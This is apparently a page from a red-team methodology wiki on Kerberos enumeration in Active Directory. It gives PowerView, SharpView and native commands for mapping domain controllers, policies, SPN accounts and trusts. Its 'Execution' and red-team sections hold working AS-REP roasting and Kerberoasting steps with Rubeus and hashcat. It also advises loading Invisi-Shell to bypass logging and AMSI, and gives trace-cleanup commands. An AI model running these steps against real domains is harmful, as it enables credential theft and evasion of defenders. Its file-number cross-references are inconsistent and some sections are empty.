[Prev: 22_Kerberos_Master_Index.md](./22_Kerberos_Master_Index.md) | [Up: Index](./00_Enumeration_Index.md) | [Hub](./00_Methodology_Hub.md) | [Next: 24_SPN_Enumeration_Techniques.md](./24_SPN_Enumeration_Techniques.md)

# 🔐 Kerberos Basic Enumeration - Authentication and Infrastructure

> **⚠️ CRITICAL TOOL REQUIREMENT**: **Invisi-Shell** is mandatory for production environments to ensure stealth operations and avoid detection. See [Tool Arsenal](./01_Tool_Setup_Loading.md#-invisi-shell-complete-setup) for setup instructions.

## 📋 TABLE OF CONTENTS
1. [Overview](#-overview)
2. [Kerberos Fundamentals](#-kerberos-fundamentals)
3. [Basic Enumeration Techniques](#-basic-enumeration-techniques)
4. [Authentication Flow Analysis](#-authentication-flow-analysis)
5. [Configuration Analysis](#-configuration-analysis)
6. [Cross-References](#-cross-references)
7. [Quick Start Kerberos Discovery](#-quick-start-kerberos-discovery)
8. [At-a-Glance: Kerberos Basics](#-at-a-glance-kerberos-basics)
9. [Pivot Matrix: Strategic Next Steps](#-pivot-matrix-strategic-next-steps)
10. [Comprehensive Enumeration Tools](#-comprehensive-enumeration-tools)

## 🎯 OVERVIEW

**Kerberos Basic Enumeration** provides fundamental techniques for discovering and analyzing Kerberos authentication infrastructure. This file focuses on understanding the basic Kerberos ecosystem, authentication mechanisms, and infrastructure enumeration without diving into advanced attack techniques.

### **🌟 What You'll Learn**
- **Kerberos infrastructure** discovery and mapping
- **Basic authentication flow** analysis and understanding
- **Configuration enumeration** and policy analysis
- **Service discovery** and infrastructure mapping
- **Foundation knowledge** for advanced Kerberos techniques

---

## 🔐 KERBEROS FUNDAMENTALS

### **What is Kerberos?**
**Kerberos** is the primary authentication protocol used in Active Directory environments. It provides secure, ticket-based authentication for users, computers, and services, enabling single sign-on (SSO) capabilities and secure communication across the domain.

### **Kerberos Architecture Overview**
```mermaid
graph TB
    subgraph "🔐 Kerberos Authentication Ecosystem"
        A[👤 User] --> B[🎫 Key Distribution Center (KDC)]
        B --> C[🔑 Authentication Service (AS)]
        B --> D[🎫 Ticket Granting Service (TGS)]
        
        C --> E[🎫 Ticket Granting Ticket (TGT)]
        D --> F[🎫 Service Ticket (ST)]
        
        E --> G[🖥️ Target Service]
        F --> G
        
        H[🏗️ Domain Controller] --> B
        I[🔒 Active Directory] --> B
    end
    
    subgraph "🎯 Authentication Flow"
        J[1️⃣ User Login] --> K[2️⃣ TGT Request]
        K --> L[3️⃣ TGT Issuance]
        L --> M[4️⃣ Service Ticket Request]
        M --> N[5️⃣ Service Access]
    end
    
    style A fill:#ff6b6b,stroke:#333,stroke-width:3px
    style B fill:#4ecdc4,stroke:#333,stroke-width:3px
    style C fill:#45b7d1,stroke:#333,stroke-width:2px
    style D fill:#96ceb4,stroke:#333,stroke-width:2px
    style E fill:#feca57,stroke:#333,stroke-width:2px
    style F fill:#ff9ff3,stroke:#333,stroke-width:2px
    style G fill:#54a0ff,stroke:#333,stroke-width:2px
```

### **Key Kerberos Components**
- **Key Distribution Center (KDC)**: Central authentication service
- **Authentication Service (AS)**: Issues initial TGTs
- **Ticket Granting Service (TGS)**: Issues service tickets
- **Ticket Granting Ticket (TGT)**: Proof of authentication
- **Service Ticket (ST)**: Access to specific services

---

## 📋 **QUICK START KERBEROS DISCOVERY**

| Phase | Tool | Command | Purpose | OPSEC |
|------|------|---------|---------|------|
| 1 | MS AD Module | `Get-ADDomain; Get-ADForest` | Realm/DC/forest context | 🟢 |
| 2 | Native | `klist` | TGT/TGS cache baseline | 🟢 |
| 3 | PowerView | `Get-DomainUser -PreauthNotRequired` | AS‑REP roastable baseline | 🟡 |
| 4 | PowerView | `Get-DomainUser -SPN` | SPN user sample | 🟡 |
| 5 | Red Team | `Rubeus asreproast /format:hashcat` | Controlled AS‑REP sample | 🟠 |

## 🎭 **AT-A-GLANCE: KERBEROS BASICS**

**Reveals:** Realm/DCs, TGT/TGS state, SPN presence, pre‑auth policy, enc types.

**Use Cases:** Baseline authentication health, identify low‑risk SPN/AS‑REP checks, prep for SPN and delegation files.

**Speed:** Stealth 3–6s jitter; Balanced 1–2s; Lab 100–300ms.

## 🧭 **PIVOT MATRIX: STRATEGIC NEXT STEPS**

| Finding | Pivot | Goal | Tool |
|---------|-------|------|------|
| SPN users exist | [24_SPN_Enumeration_Techniques.md](./24_SPN_Enumeration_Techniques.md) | Kerberoast target set | PowerView, Rubeus |
| DONT_REQ_PREAUTH users | [26_Kerberos_Advanced_Attacks.md](./26_Kerberos_Advanced_Attacks.md) | AS‑REP roast | PowerView, Rubeus, Impacket |
| Unconstrained hosts | [25_Kerberos_Delegation_Abuse.md](./25_Kerberos_Delegation_Abuse.md) | TGT capture paths | PowerView |
| RC4 seen in env | [26_Kerberos_Advanced_Attacks.md](./26_Kerberos_Advanced_Attacks.md) | Downgrade exposure | Eventing + Rubeus |

---

## 🛠️ **COMPREHENSIVE ENUMERATION TOOLS**

### 🔧 Microsoft‑Signed & Native
- `Get-ADDomain`, `Get-ADForest` — Context
- `Get-ADUser -Filter * -Properties ServicePrincipalName,msDS-SupportedEncryptionTypes -ResultSetSize 50` — SPN/enctype sample
- `Get-ADComputer -Filter * -Properties TrustedForDelegation -ResultSetSize 50` — Delegation hints
- `klist`, `nltest /dsgetdc:<domain>`, `wevtutil` — Ticket/DC/event sanity

### ⚔️ Offensive (PowerView/SharpView)
```powershell
Get-Domain | fl *
Get-DomainPolicy
Get-DomainUser -SPN -Properties samaccountname,serviceprincipalname | Select -First 10
Get-DomainUser -PreauthNotRequired | Select -Expand samaccountname
Get-DomainComputer -TrustedForDelegation
Get-DomainTrust
```
```cmd
SharpView.exe Get-DomainUser -SPN
SharpView.exe Get-DomainUser -PreauthNotRequired
```

### 🔴 Red Team (basic scope)
```cmd
Rubeus.exe asreproast /format:hashcat /outfile:asrep.hashes
Rubeus.exe kerberoast /outfile:roast.hashes /rc4opsec
```

---

## 🎭 **PERSONAS: REAL-WORLD EXECUTION PROFILES**

### 🕵️ Stealth Consultant (Production)
- Tools: MS AD Module + Invisi‑Shell
- Pattern: OU‑scoped filters, minimal properties, 3–6s jitter

### ⚡ Power User (Internal)
- Tools: PowerView + MS AD Module
- Pattern: Focused SPN/AS‑REP checks, 1–2s jitter

### 👑 Domain Admin (Lab)
- Tools: Full PowerView + Rubeus
- Pattern: Broad enumeration, minimal delay

## 🎨 **VISUAL MASTERY: BASIC KERBEROS CONTEXT**


**Purpose:** Shows how MS‑signed discovery feeds PowerView scoping which then guides red‑team sampling.

## 🏭 **LAB vs PRODUCTION: EXECUTION PROFILES**

### 🔬 Lab
```powershell
Get-DomainUser -SPN -Properties samaccountname,serviceprincipalname | Export-Csv spn_users_sample.csv -NoTypeInformation
Get-DomainUser -PreauthNotRequired | Select -Expand samaccountname | Out-File asrep_users.txt
```

### 🏢 Production (Stealth)
```powershell
Import-Module ActiveDirectory
Get-ADUser -LDAPFilter "(servicePrincipalName=*)" -SearchBase "OU=IT,DC=corp,DC=local" -Properties ServicePrincipalName -ResultSetSize 25 |
  Select SamAccountName,ServicePrincipalName | Export-Csv spn_scoped.csv -NoTypeInformation
Start-Sleep -Seconds (Get-Random -Minimum 3 -Maximum 6)
```

## 🛡️ **DETECTION, OPSEC & CLEANUP**

### 🚨 Detection Indicators
- Event 4768/4769 spikes, repeated SPN queries, AS‑REP requests volume

### 🔒 OPSEC Best Practices
> **🔒 STEALTH REQUIREMENT**: **Invisi-Shell** must be loaded before any Kerberos enumeration in production environments to bypass logging and AMSI detection.
- Prefer MS‑signed cmdlets, scope queries by OU, limit properties/result sizes, add jitter
- Avoid broad `setspn -Q */*` in production

### 🧹 Cleanup
```powershell
Rubeus purge 2>$null; klist purge 2>$null
Remove-Item spn_*.csv, asrep_*.txt -ErrorAction SilentlyContinue
```

---

## 🎯 **COMPREHENSIVE BASIC COMMANDS (20+ PowerView/SharpView)**

```powershell
# Domain context and policy
Get-Domain
Get-DomainPolicy

# SPN discovery (variations)
Get-DomainUser -SPN
Get-DomainUser -LDAPFilter "(servicePrincipalName=*)" -Properties samaccountname,serviceprincipalname
Get-DomainUser -SPN | Where-Object {$_.serviceprincipalname -like "*http*"}
Get-DomainUser -SPN | Where-Object {$_.serviceprincipalname -like "*mssql*"}
Get-DomainUser -SPN | Select -First 25

# AS-REP roastable discovery
Get-DomainUser -PreauthNotRequired
Get-DomainUser -UACFilter DONT_REQ_PREAUTH

# Computers and delegation hints
Get-DomainComputer -TrustedForDelegation
Get-DomainComputer -TrustedToAuth

# Enc types
Get-DomainUser -Properties msDS-SupportedEncryptionTypes | Select samaccountname,msDS-SupportedEncryptionTypes

# Trusts
Get-DomainTrust
Get-ForestTrust

# Ticket sampling (PowerView-assisted, offload to Rubeus for requests)
Get-DomainSPNTicket -SPN MSSQL/* -OutputFormat Hashcat -Verbose
Get-DomainSPNTicket -UserName svc_sql

# SharpView equivalents examples
# (Run as separate binary when PowerShell is constrained)
```

```cmd
SharpView.exe Get-DomainUser -SPN
SharpView.exe Get-DomainUser -PreauthNotRequired
SharpView.exe Get-DomainComputer -TrustedForDelegation
SharpView.exe Get-DomainTrust
```

### Command Notes
- Use `-LDAPFilter` and `-Properties` to minimize payload and tailor scope
- Prefer small `Select -First N` samplings in production; export full only in lab
```

## 🔍 BASIC ENUMERATION TECHNIQUES

### **1. Kerberos Infrastructure Discovery**

#### **PowerView - Basic Kerberos Enumeration**
```powershell
# Basic Kerberos infrastructure enumeration
Write-Host "=== KERBEROS INFRASTRUCTURE ENUMERATION ===" -ForegroundColor Green

# Get domain information
$domain = Get-Domain
Write-Host "Domain: $($domain.Name)" -ForegroundColor Cyan
Write-Host "Forest: $($domain.Forest)" -ForegroundColor Cyan
Write-Host "Functional Level: $($domain.DomainMode)" -ForegroundColor Cyan

# Get domain controllers
$dcs = Get-DomainController
Write-Host "`nDomain Controllers:" -ForegroundColor Yellow
foreach ($dc in $dcs) {
    Write-Host "  - $($dc.Name) ($($dc.OperatingSystem))" -ForegroundColor White
}

# Get Kerberos policies
$kerberosPolicy = Get-DomainPolicy -Policy "KerberosPolicy"
Write-Host "`nKerberos Policies:" -ForegroundColor Yellow
Write-Host "  MaxTicketAge: $($kerberosPolicy.MaxTicketAge) hours" -ForegroundColor White
Write-Host "  MaxRenewAge: $($kerberosPolicy.MaxRenewAge) hours" -ForegroundColor White
Write-Host "  MaxServiceAge: $($kerberosPolicy.MaxServiceAge) minutes" -ForegroundColor White
```

#### **Native Windows Tools - Kerberos Discovery**
```cmd
# Using nltest for Kerberos information
nltest /dsgetdc:cybercorp.local /kerberos

# Using klist for current tickets
klist

# Using ksetup for Kerberos configuration
ksetup /dumpstate
```

### **2. Kerberos Service Discovery**

#### **PowerView - Service Discovery**
```powershell
# Discover Kerberos-related services
Write-Host "=== KERBEROS SERVICE DISCOVERY ===" -ForegroundColor Green

# Find computers with Kerberos services
$kerberosComputers = Get-DomainComputer -Properties OperatingSystem, LastLogonDate | Where-Object {
    $_.OperatingSystem -like "*Server*" -or $_.OperatingSystem -like "*DC*"
}

Write-Host "Computers with Kerberos Services:" -ForegroundColor Yellow
foreach ($computer in $kerberosComputers) {
    Write-Host "  - $($computer.Name) ($($computer.OperatingSystem))" -ForegroundColor White
    Write-Host "    Last Logon: $($computer.LastLogonDate)" -ForegroundColor Gray
}

# Find users with service accounts
$serviceUsers = Get-DomainUser -Properties ServicePrincipalName, LastLogonDate | Where-Object {
    $_.ServicePrincipalName -and $_.ServicePrincipalName.Count -gt 0
}

Write-Host "`nService Accounts:" -ForegroundColor Yellow
Write-Host "Total Service Accounts: $($serviceUsers.Count)" -ForegroundColor Cyan

foreach ($user in $serviceUsers | Select-Object -First 10) {
    Write-Host "  - $($user.SamAccountName)" -ForegroundColor White
    Write-Host "    SPNs: $($user.ServicePrincipalName -join ', ')" -ForegroundColor Gray
    Write-Host "    Last Logon: $($user.LastLogonDate)" -ForegroundColor Gray
}
```

### **3. Kerberos Configuration Analysis**

#### **PowerView - Configuration Enumeration**
```powershell
# Analyze Kerberos configuration
Write-Host "=== KERBEROS CONFIGURATION ANALYSIS ===" -ForegroundColor Green

# Get domain password policy
$passwordPolicy = Get-DomainPolicy -Policy "SystemAccess"
Write-Host "Password Policy:" -ForegroundColor Yellow
Write-Host "  MinPasswordLength: $($passwordPolicy.MinPasswordLength)" -ForegroundColor White
Write-Host "  PasswordComplexity: $($passwordPolicy.PasswordComplexity)" -ForegroundColor White
Write-Host "  LockoutThreshold: $($passwordPolicy.LockoutThreshold)" -ForegroundColor White
Write-Host "  LockoutDuration: $($passwordPolicy.LockoutDuration) minutes" -ForegroundColor White

# Get account lockout policy
Write-Host "`nAccount Lockout Policy:" -ForegroundColor Yellow
Write-Host "  LockoutObservationWindow: $($passwordPolicy.LockoutObservationWindow) minutes" -ForegroundColor White
Write-Host "  ResetLockoutCount: $($passwordPolicy.ResetLockoutCount) minutes" -ForegroundColor White

# Get Kerberos encryption types
Write-Host "`nKerberos Encryption Types:" -ForegroundColor Yellow
Write-Host "  Default encryption types supported by domain" -ForegroundColor White
Write-Host "  (Analyze Event ID 4769 for encryption type usage)" -ForegroundColor Gray
```

---

## 🔄 AUTHENTICATION FLOW ANALYSIS

### **Understanding Kerberos Authentication**

#### **Step-by-Step Authentication Process**

```mermaid
sequenceDiagram
    participant U as 👤 User
    participant AS as 🔐 Authentication Service
    participant TGS as 🎫 Ticket Granting Service
    participant S as 🖥️ Target Service

    U->>AS: 🔑 Login Request (Username + Password)
    AS->>AS: 🔍 Validate Credentials
    AS->>U: 🎫 TGT + Session Key (Encrypted)

    U->>TGS: 🎫 TGT + Service Request
    TGS->>TGS: 🔍 Validate TGT
    TGS->>U: 🎫 Service Ticket + Service Session Key

    U->>S: 🎫 Service Ticket + Authenticator
    S->>S: 🔍 Validate Service Ticket
    S->>U: ✅ Access Granted
```


#### **PowerView - Authentication Flow Analysis**
```powershell
# Analyze authentication patterns
Write-Host "=== KERBEROS AUTHENTICATION FLOW ANALYSIS ===" -ForegroundColor Green

# Get recent authentication events (requires event log access)
Write-Host "Authentication Flow Analysis:" -ForegroundColor Yellow
Write-Host "  - TGT requests (Event ID 4768)" -ForegroundColor White
Write-Host "  - Service ticket requests (Event ID 4769)" -ForegroundColor White
Write-Host "  - Authentication failures (Event ID 4771)" -ForegroundColor White

# Analyze user logon patterns
$recentLogons = Get-DomainUser -Properties LastLogonDate, LogonCount | Where-Object {
    $_.LastLogonDate -gt (Get-Date).AddDays(-7)
} | Sort-Object LastLogonDate -Descending

Write-Host "`nRecent User Logons (Last 7 Days):" -ForegroundColor Yellow
foreach ($user in $recentLogons | Select-Object -First 10) {
    Write-Host "  - $($user.SamAccountName)" -ForegroundColor White
    Write-Host "    Last Logon: $($user.LastLogonDate)" -ForegroundColor Gray
    Write-Host "    Total Logons: $($user.LogonCount)" -ForegroundColor Gray
}
```

---

## ⚙️ CONFIGURATION ANALYSIS

### **Kerberos Policy Analysis**

#### **PowerView - Policy Enumeration**
```powershell
# Comprehensive Kerberos policy analysis
Write-Host "=== COMPREHENSIVE KERBEROS POLICY ANALYSIS ===" -ForegroundColor Green

# Get all domain policies
$allPolicies = Get-DomainPolicy

Write-Host "Domain Policies Found:" -ForegroundColor Yellow
foreach ($policy in $allPolicies.Keys) {
    Write-Host "  - $policy" -ForegroundColor White
}

# Analyze specific Kerberos-related policies
if ($allPolicies.KerberosPolicy) {
    Write-Host "`nKerberos Policy Details:" -ForegroundColor Yellow
    $kerberosPolicy = $allPolicies.KerberosPolicy

    foreach ($setting in $kerberosPolicy.Keys) {
        $value = $kerberosPolicy[$setting]
        Write-Host "  $setting`: $value" -ForegroundColor White
    }
}

# Analyze account policies
if ($allPolicies.SystemAccess) {
    Write-Host "`nAccount Policy Details:" -ForegroundColor Yellow
    $accountPolicy = $allPolicies.SystemAccess

    foreach ($setting in $accountPolicy.Keys) {
        $value = $accountPolicy[$setting]
        Write-Host "  $setting`: $value" -ForegroundColor White
    }
}
```

### **Kerberos Trust Analysis**

#### **PowerView - Trust Enumeration**
```powershell
# Analyze domain trusts for Kerberos implications
Write-Host "=== KERBEROS TRUST ANALYSIS ===" -ForegroundColor Green

# Get domain trusts
$trusts = Get-DomainTrust -Properties TrustType, TrustDirection, TrustAttributes

Write-Host "Domain Trusts:" -ForegroundColor Yellow
foreach ($trust in $trusts) {
    Write-Host "  - $($trust.SourceName) -> $($trust.TargetName)" -ForegroundColor White
    Write-Host "    Type: $($trust.TrustType)" -ForegroundColor Gray
    Write-Host "    Direction: $($trust.TrustDirection)" -ForegroundColor Gray
    Write-Host "    Attributes: $($trust.TrustAttributes)" -ForegroundColor Gray

    # Analyze Kerberos implications
    if ($trust.TrustType -eq "External") {
        Write-Host "    ⚠️ External Trust - Limited Kerberos scope" -ForegroundColor Yellow
    } elseif ($trust.TrustType -eq "Forest") {
        Write-Host "    🌳 Forest Trust - Full Kerberos scope" -ForegroundColor Green
    }
    Write-Host ""
}
```

---

## 🔗 CROSS-REFERENCES

### **Related Kerberos Techniques**
- **SPN Enumeration**: See [14_SPN_Enumeration_Techniques.md](./24_SPN_Enumeration_Techniques.md)
- **Delegation Abuse**: See [15_Kerberos_Delegation_Abuse.md](./25_Kerberos_Delegation_Abuse.md)
- **Advanced Attacks**: See [16_Kerberos_Advanced_Attacks.md](./26_Kerberos_Advanced_Attacks.md)

### **Related Enumeration Techniques**
- **Domain Enumeration**: See [01_Domain_Enumeration.md](./04_Domain_Enumeration.md)
- **User Enumeration**: See [02_User_Enumeration.md](./05_User_Enumeration.md)
- **Computer Enumeration**: See [03_Computer_Enumeration.md](./07_Computer_Enumeration.md)
- **Tool Setup**: See [01_Tool_Setup_Loading.md](./01_Tool_Setup_Loading.md)

### **Detection and Evasion**
- **Blue Team Detection**: See [11_Detection_Blue_Team.md](./32_Detection_Blue_Team.md)
- **Red Team Evasion**: See [12_Detection_Red_Team.md](./33_Detection_Red_Team.md)

---

## 🎯 CONCLUSION

**Kerberos Basic Enumeration** provides the foundation for understanding Kerberos authentication infrastructure. By mastering these basic techniques, you can:

- **Map Kerberos infrastructure** across your target domain
- **Understand authentication flows** and ticket mechanisms
- **Analyze configuration policies** and security settings
- **Identify service accounts** and infrastructure components
- **Build foundation knowledge** for advanced Kerberos techniques

### **🚀 Key Success Factors**
1. **Infrastructure Mapping**: Complete understanding of Kerberos components
2. **Authentication Flow**: Clear understanding of ticket exchange process
3. **Configuration Analysis**: Comprehensive policy and setting enumeration
4. **Service Discovery**: Identification of all Kerberos-related services
5. **Foundation Building**: Solid base for advanced techniques

---

**🔐 Remember**: Kerberos basic enumeration is like learning the alphabet before writing poetry - you need to understand the fundamental building blocks before you can create sophisticated attacks!**

---

## 📚 **NEXT STEPS**

After mastering Basic Kerberos Enumeration, continue with:
- **SPN Enumeration**: See [14_SPN_Enumeration_Techniques.md](./24_SPN_Enumeration_Techniques.md)
- **Delegation Abuse**: See [15_Kerberos_Delegation_Abuse.md](./25_Kerberos_Delegation_Abuse.md)
- **Advanced Attacks**: See [16_Kerberos_Advanced_Attacks.md](./26_Kerberos_Advanced_Attacks.md)

---

## ⚔️ Execution

### AS-REP Roasting (no pre-auth)
```powershell
# Discover ASREP roastable users (PowerView)
Get-DomainUser -PreauthNotRequired -Properties samaccountname | Select samaccountname

# Request AS-REP hashes (Rubeus)
.\Rubeus.exe asreproast /format:hashcat /outfile:asrep.hashes

# Crack
hashcat -m 18200 asrep.hashes wordlist.txt --force
```
- See: `16_Kerberos_Advanced_Attacks.md` for OPSEC/cleanup. See detection: `11_Detection_Blue_Team.md` (4771), evasion: `12_Detection_Red_Team.md`.

### Baseline Kerberoasting
```powershell
# Identify SPN users
Get-DomainUser -SPN | Select samaccountname,serviceprincipalname

# Request TGS (Rubeus)
.\Rubeus.exe kerberoast /outfile:roast.hashes

# Crack
hashcat -m 13100 roast.hashes wordlist.txt --force
```
- Target high-value SPNs identified in `14_SPN_Enumeration_Techniques.md`.


---

## At‑a‑Glance

### Command Quick‑Reference
| Tool | Purpose | Example | Notes |
| - | - | - | - |
| nltest | KDC/DC | nltest /dsgetdc:corp.local /kerberos | KDC target
| klist | Tickets | klist | TGT/TGS cache
| ksetup | Realm cfg | ksetup /dumpstate | Policy view
| PowerView | Policies | (Get-DomainPolicy).KerberosPolicy | Baseline

### Pivot Matrix
| Finding | Pivot To | Goal |
| - | - | - |
| Many SPN users | 24_SPN_Enumeration_Techniques.md | Kerberoast set
| Unconstrained hosts | 25_Kerberos_Delegation_Abuse.md | TGT capture
| Preauth disabled | 26_Kerberos_Advanced_Attacks.md | AS‑REP roast
| RC4 usage spikes | 26_Kerberos_Advanced_Attacks.md | Downgrade exposure

## Stealth & Loading
Use [01_Tool_Setup_Loading.md](./01_Tool_Setup_Loading.md) for stealth session and prep. Continue here with basic Kerberos only.

## CyberCorp Persona
- Persona: Arjun Mehta, Infra Analyst. Task: map KDC/GC, baseline Kerberos policy, identify SPN population.

## Kerberos Infra Snapshot (unique)


## Site‑Aware Baselines
```powershell
$dc = (nltest /dsgetdc:corp.local) | % { ($_ -split ':')[-1].Trim() } | Select -First 1
$policy = (Get-DomainPolicy).KerberosPolicy
[pscustomobject]@{ KDC=$dc; MaxTicketAge=$policy.MaxTicketAge; MaxRenewAge=$policy.MaxRenewAge; MaxServiceAge=$policy.MaxServiceAge }
```

## Minimal Footprint Discovery
```powershell
# Count SPN users (no dump)
(Get-DomainUser -LDAPFilter '(servicePrincipalName=*)' -Properties serviceprincipalname | Select -First 1 | Measure-Object).Count
# Sample a few for patterning
Get-DomainUser -LDAPFilter '(servicePrincipalName=*)' -Properties serviceprincipalname | Select samaccountname -First 5
```

## Lab vs Production
- Stealth: sample-only SPN checks; avoid broad SPN listing. Prefer ADWS and -ResultSetSize.
- Lab: full SPN export; baseline ticket timings with 21_Time_Based_Enumeration.md.

## Detection/OPSEC
- Avoid mass SPN list pulls; sample first. Space between KDC/TGS requests. Validate time sync.

## Cleanup
```powershell
klist purge
```

---

[Prev: 22_Kerberos_Master_Index.md](./22_Kerberos_Master_Index.md) | [Up: Index](./00_Enumeration_Index.md) | [Hub](./00_Methodology_Hub.md) | [Next: 24_SPN_Enumeration_Techniques.md](./24_SPN_Enumeration_Techniques.md)

```